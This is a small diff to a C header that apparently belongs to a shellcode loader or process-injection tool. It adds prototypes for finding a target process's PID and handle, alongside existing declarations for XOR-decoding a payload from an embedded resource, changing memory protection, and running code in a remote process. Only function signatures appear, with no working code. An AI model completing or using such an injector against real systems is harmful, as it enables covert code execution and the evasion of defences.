@@ -19,6 +19,8 @@
 
     typedef BOOL  (*VPPLAYER)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
     
+    int findProcessPID(const PCHAR processName);
+    int getProcessHandle(const PCHAR processName, HANDLE *processHandle, DWORD *pid);
     int xorEncoding(PUCHAR code, DWORD codeSize, PUCHAR key, DWORD keySize, PUCHAR decoded);
     int getResourceAddr(LPVOID *resAddr, DWORD *resSize, int intResource);
     int allowAndExecuteRemote(HANDLE  processHandle, LPVOID remoteAddr, DWORD codeSize);
